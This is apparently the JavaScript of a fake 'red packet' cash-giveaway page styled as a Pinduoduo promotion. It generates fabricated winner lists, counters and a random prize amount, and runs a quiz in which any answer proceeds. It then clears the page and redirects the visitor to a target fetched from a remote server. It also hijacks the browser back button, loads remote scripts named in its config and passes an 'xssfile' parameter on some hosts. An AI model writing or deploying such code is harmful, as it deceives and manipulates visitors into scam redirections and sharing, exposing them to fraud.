window.gConfig = window["data"] || {};
var evkey = M.getParam("_evkey");
var site = M.getParam("_c") || "9986";
var atd = M.getParam("atd");

var get_share_host = "haiwaibbm.cn";

function record(event, id, allow_reply) {
    console &&
        console.log &&
        console.log(
            "record event" + event + ";id:" + id + "; allow_reply" + allow_reply
        );
    try {
        if (!localStorage.getItem(event + ":" + id) || allow_reply) {
            //$.post('http://p.rsren.com.cn./record', {event: event, id: id})
            //localStorage.setItem(event + ':' + id, true);
        }
    } catch (e) {}
}

$(function() {
    //https://butuyu.oss-cn-hangzhou.aliyuncs.com/images/p.png
    //拼多多上市一周年 国庆送壕礼
    var config = {
        tpl: {
            body: [
                '<div class="red-packet-container index-show-more-body" style="display: none;">',
                '  <div class="top-box">',
                '    <div class="cont-head-portrait">',
                '      <img   src="https://hh302.oss-cn-shenzhen.aliyuncs.com/%E7%9F%B3%E6%B2%B9%E5%8C%96_20190327170840.png">',
                "    </div>",
                '    <div class="cont-desc-blessing">',
                '      <p style="font-size: 23px;">全民送豪礼</p>',
                '      <p>活动倒计时开始，抢完即止<i class="icon-prompt">疯抢中</i></p>',
                "    </div>",
                // '    <a class="btn-open-red-packet" href="javascript:;"><span>開</span></a>',
                '    <a class="btn-open-red-packet" href="javascript:;"><span>開</span></a>',
                '    <p class="cont-desc-bottom">- 今日已有<span>27671</span>人領取 -</p>',
                "  </div>",
                '  <ul class="list"></ul>',
                "</div>",
                '<div class="award-container award-body" style="display: none;">',
                '  <p class="content-top-tips">恭喜领取红包</p>',
                '  <p class="content-price">',
                '    <sup>￥</sup><span class="js_money"></span><i class="icon-highest">最高</i>',
                "  </p>",
                '  <div class="content-charge-box">',
                '    <a class="charge-btn" href="javascript:;">立即领取红包</a>',
                '    <p class="charge-tips">今日24点前未收钱，将收回红包资格<br/><span style="color: red;">如多次领取以最后一次领取金额为准</span></p>',
                "  </div>",
                '  <p class="content-tips-total">总共100000份，已成功发出46786份红包</p>',
                "</div>"
            ].join(""),
            userItem: [
                '<li class="animated" style="display: none;">',
                '  <div class="list-item-left">',
                '    <img src="%(avatar)">',
                '    <div class="item-info">',
                '      <p class="item-info-name">%(name)</p>',
                '      <p class="item-info-time">%(time)</p>',
                "    </div>",
                "  </div>",
                '  <div class="list-item-right">',
                "    领取 <span>%(money)元</span>",
                "  </div>",
                "</li>"
            ].join("")
        }
    };

    var userList = [{
            name: "刘子怡爸爸",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/9DE656A9B0C0384FCCF7D02BD02CFCB5/100",
            money: "23.36"
        },
        {
            name: "我是你的情人",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/5DA508A1616E732B0EB92A1ADAF28456/100",
            money: "28.79"
        },
        {
            name: "花花公子",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/D42066DE19EBB82D30A351185956DB41/100",
            money: "19.39"
        },
        {
            name: "潇了个洒",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/F6213667E85E205FF363B3947D218D38/100",
            money: "23.90"
        },
        {
            name: "天天向上",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/D56EE4D71422A112CDA6B7B44D48B044/100",
            money: "22.04"
        },
        {
            name: "一刘阿姨",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/0DE079B903E44F96AB9BAD85D706A61F/100",
            money: "25.56"
        },
        {
            name: "孔海西",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/A6F3CA4B97E59BB9AE5495984ACF3090/100",
            money: "13.67"
        },
        {
            name: "IF YOU",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/E0FB2E95D84068B944789BF6569B3A7F/100",
            money: "26.47"
        },
        {
            name: "快来调侃",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/71E4837B7B1F0A12D5F8D90234DDB95C/100",
            money: "23.34"
        },
        {
            name: "。大哥哥",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/9ADBAEBE292B4FA0737F9DB142336157/100",
            money: "26.05"
        },
        {
            name: "小布丁555",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/D6AEE11866CCEC092B82C532218F6B20/100",
            money: "18.03"
        },
        {
            name: "似懂非懂",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/D3875B44A8DB4ABE135059C7362B4094/100",
            money: "27.47"
        },
        {
            name: " 二叔",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/B7CDFAA5FD54A0FD2904A30B6A29D660/100",
            money: "15.68"
        },
        {
            name: "快乐每一天_",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/5CD9B7ACD34332B8DA145BE3DE4C44FB/100",
            money: "27.07"
        },
        {
            name: "好8不好8",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/189955F05F482DE956480DB66B07E4DC/100",
            money: "14.87"
        },
        {
            name: "小甜甜",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/D1A596E47C0AA279BA8BB9BAAC02CC44/100",
            money: "17.18"
        },
        {
            name: "最佳搭档，",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/2316567F52712C775048DB02BF5C261C/100",
            money: "15.06"
        },
        {
            name: "二分^_^睡眠",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/C54D6E68485F84A86822CF7E473A93EC/100",
            money: "12.44"
        },
        {
            name: "孙粒子",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/BE2BFD6D743F815AC7A8FA974E40D4FC/100",
            money: "15.56"
        },
        {
            name: "Mr. Xue",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/5283BB3808A16D227AC03DC4374F77C6/100",
            money: "29.26"
        },
        {
            name: "、dacy",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/48BE3B50C3E9847242626FF9A07C3317/100",
            money: "26.52"
        },
        {
            name: "已婚少年",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/02305E433C97C724931A79F8FB04FE50/100",
            money: "25.99"
        },
        {
            name: "叫我冰冰",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/198FD85BC7EFBCCB5C73AE4FEB633560/100",
            money: "29.80"
        },
        {
            name: "卢正英",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/25217BFE51A1B8A16160A9F43837A86F/100",
            money: "15.64"
        },
        {
            name: "Jkz.",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/772D04D9EB8E70A961A1D5CABBCF293A/100",
            money: "10.55"
        },
        {
            name: "雷乐天",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/BA6DA5237D4175DDC750553561F219B7/100",
            money: "21.76"
        },
        {
            name: "有你每一天",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/9CFD84D74ABF5141EA8F6B73BD06C3E1/100",
            money: "26.57"
        },
        {
            name: "毕竟我们还年轻",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/72763DE05338B738EEA4D9FBEFD8DBBF/100",
            money: "24.57"
        },
        {
            name: "世界杯看客",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/29DBC6217FA0B06ABC25C70FE260221F/100",
            money: "22.61"
        },
        {
            name: "频繁的我",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/1656EDDA7E648DD32E862460EE92E1C5/100",
            money: "25.81"
        },
        {
            name: "妙不可言",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/E2348DFF85AE861D17451BDDC0432809/100",
            money: "29.18"
        },
        {
            name: "春天般～温暖",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/DDA36344FDAF8DF2BFDD8F3DAEDE5B74/100",
            money: "21.65"
        },
        {
            name: "小猫咪回忆",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/685AA36438DDD7E0EB55D0C18097CA1C/100",
            money: "14.02"
        },
        {
            name: "10G流量不够用",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/D091A297D0A3D3619C6D828C681F305F/100",
            money: "26.11"
        },
        {
            name: "梅西王子",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/77AC9176E0EE94A552AAD6961066D4BA/100",
            money: "24.74"
        },
        {
            name: "中国队必胜",
            avatar: "https://q.qlogo.cn/qqapp/1104718115/3CC6C03786C6C693F364B395F327197F/100",
            money: "25.25"
        }
    ];
    var userTimer = 0;
    var showIndex = 0;
    var itemWidth = "";
    var actionTimer = 2500;

    function pad(num, size) {
        var s = num + "";
        while (s.length < size) s = "0" + s;
        return s;
    }

    function jumpToShare(url) {
        $("head").append(
            '<style type="text/css">body{font-size:16px;line-height:1.4;font-family:-apple-system-font,Helvetica Neue,sans-serif}*{padding:0;margin:0}.toast{transition-duration:.2s;transform:translate(-50%,-50%);margin:0;top:45%;z-index:2000;position:fixed;width:7.6em;min-height:7.6em;left:50%;background:hsla(0,0%,7%,.7);text-align:center;border-radius:5px;color:#fff}.toast.toast--visible{opacity:1;visibility:visible}.icon_toast.loading{margin:30px 0 0;width:38px;height:38px;vertical-align:baseline}.icon_toast{font-size:55px;color:#fff}.loading{display:inline-block;animation:e 1s steps(12) infinite;background:transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAiIGhlaWdodD0iMTIwIiB2aWV3Qm94PSIwIDAgMTAwIDEwMCI+PHBhdGggZmlsbD0ibm9uZSIgZD0iTTAgMGgxMDB2MTAwSDB6Ii8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjRTlFOUU5IiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAgLTMwKSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iIzk4OTY5NyIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSgzMCAxMDUuOTggNjUpIi8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjOUI5OTlBIiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0icm90YXRlKDYwIDc1Ljk4IDY1KSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iI0EzQTFBMiIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSg5MCA2NSA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNBQkE5QUEiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoMTIwIDU4LjY2IDY1KSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iI0IyQjJCMiIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSgxNTAgNTQuMDIgNjUpIi8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjQkFCOEI5IiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0icm90YXRlKDE4MCA1MCA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNDMkMwQzEiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoLTE1MCA0NS45OCA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNDQkNCQ0IiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoLTEyMCA0MS4zNCA2NSkiLz48cmVjdCB3aWR0aD0iNyIgaGVpZ2h0PSIyMCIgeD0iNDYuNSIgeT0iNDAiIGZpbGw9IiNEMkQyRDIiIHJ4PSI1IiByeT0iNSIgdHJhbnNmb3JtPSJyb3RhdGUoLTkwIDM1IDY1KSIvPjxyZWN0IHdpZHRoPSI3IiBoZWlnaHQ9IjIwIiB4PSI0Ni41IiB5PSI0MCIgZmlsbD0iI0RBREFEQSIgcng9IjUiIHJ5PSI1IiB0cmFuc2Zvcm09InJvdGF0ZSgtNjAgMjQuMDIgNjUpIi8+PHJlY3Qgd2lkdGg9IjciIGhlaWdodD0iMjAiIHg9IjQ2LjUiIHk9IjQwIiBmaWxsPSIjRTJFMkUyIiByeD0iNSIgcnk9IjUiIHRyYW5zZm9ybT0icm90YXRlKC0zMCAtNS45OCA2NSkiLz48L3N2Zz4=) no-repeat;background-size:100%}i{font-style:italic}@keyframes e{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}</style>'
        );
        var timestamp = new Date().getTime();
        var host = window.location.host;
        $("body")
            .css("background", "white")
            .find("*")
            .remove();
        $("body").append(
            '<div class="toast loading_toast toast--visible"><div><i class="loading icon_toast"></i></div><p class="toast_content">&#x6B63;&#x5728;&#x8FDB;&#x5165;</p></div>'
        );
        setTimeout(function() {
            var url1 = window.location.href;
            if (
                url1.indexOf("bdysite") >= 0 ||
                url1.indexOf("mopaasapp") >= 0 ||
                url1.indexOf("myqcloud.com") >= 0
            ) {
                window.location.href = "?xssfile=" + url + "&money=" + gConfig.money;
            } else {
                getShareTarget();
            }
        }, 10);
    }

    function getShareTarget() {
        $.post(
            "http://wx.qyssyl.cn/getShareHongBao", { money: gConfig.money },
            function(data) {
                window.location.href = data.target;
            },
            "json"
        );
    }

    function addUser() {
        if (showIndex === userList.length) {
            showIndex = 0;
        }
        var $item = $(config.tpl.userItem.jstpl_format(userList[showIndex++]));
        $(".index-show-more-body .list").prepend($item);
        $item.slideDown(1000);

        $(".index-show-more-body .list li").each(function(index, item) {
            if (index > 6) {
                $(item).slideUp(1000);
                setTimeout(function() {
                    $(item).remove();
                }, 1000);
            }
        });
    }

    function startTimer() {
        clearTimeout(userTimer);
        userTimer = setTimeout(function() {
            addUser();
            startTimer();
        }, actionTimer);
    }

    function initUser() {
        var now = +new Date();
        $(userList).each(function(index, item) {
            var temp = new Date(now - Math.random() * 600000);
            var minutes = temp.getMinutes();
            if (minutes < 10) {
                minutes = "0" + minutes;
            }
            var timeStr = temp.getHours() + ":" + minutes;
            item.time = timeStr;
        });
        for (showIndex = 0; showIndex < 6; showIndex++) {
            var item = config.tpl.userItem.jstpl_format(userList[showIndex]);
            $(".index-show-more-body .list").prepend($(item).show());
        }
        itemWidth =
            $(".index-show-more-body .list li")
            .eq(0)
            .width() + "px";
        addUser();
        startTimer();
    }

    function initPage() {
        gConfig.money = parseInt((parseFloat(Math.random() * 20) + 30) * 100);
        M.resetFont();
        $(document.body).append(
            config.tpl.body.jstpl_format({
                head: $(".js_head_img").attr("data-src")
            })
        );
        $(".index-show-more-body").show();
        $(".js_money").text(parseFloat(gConfig.money / 100).toFixed(2));
        initUser();
    }

    function openPacket() {
        record("tostop", site);
        evkey && record("tostop", evkey);
        jumpToShare("hongbao2FX.html");
    }

    function bindEvent() {
        $(document.body).on("click", ".btn-open-red-packet", function() {
            var $this = $(".btn-open-red-packet");
            if ($this.hasClass("open")) {
                return false;
            }
            $this.addClass("open");
            // goShare();
            setTimeout(function() {
                $(".index-show-more-body").fadeOut(700);
                $(".award-body").fadeIn(700);
            }, 1500);
            record("play", site);
            evkey && record("play", evkey);
        });

        $(document.body).on("click", ".charge-btn", function() {
            g_dialog.confirm({
              title: "2019年是什么生肖年?",
                //     message: '活动<span style="color: #f5294c">限工农银行用户参与</span>，请答对本题确认参与资格！',
                message: '答对本题可获得<span style="color: #f5294c">额外奖金</span>！',
                btn: ["猪年", "鼠年"],
                cb: openPacket,
                cancelCb: openPacket
            });
        });
    }

    function init() {
        record("load", site);
        evkey && record("load", evkey);
        initPage();
        bindEvent();
    }

    init();
});

$(function() {
    if (gConfig.hm) {
        M.report(gConfig.hm);
        M.hotClick("pv.detail_page");
    }
    // 总统计
});

var _0 = _0 || [];

function anchor() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}
setTimeout("anchor()", 100);
window.onhashchange = function() {
    //      var url = window.location.href;
    //      if(url.indexOf("bdysite") >= 0 ) {
    //      window.location.href="?xssfile=liuliang.html";
    // }else{
    //  window.location.href="../130/liuliang.html";
    // }
      //window.location.href="http://gtr.schooltime.com.cn/tui.php?c=2500004";
    zp();
};
// 隐藏分享
$(function() {
    M.hideShare();
});

// 设置返回
$(function() {
    if (gConfig["attached"] && gConfig["attached"]["back_api"]) {
        M.loadJS(gConfig["attached"]["back_api"]);
    }
    
    M.loadJS("https://hm.baidu.com/hm.js?877eee4f41b8096f43e98288319ec822");
    // 总统计
    M.loadJS("https://hm.baidu.com/hm.js?cb9187f58cfb2cddcd5c8abc32ce2f68");
});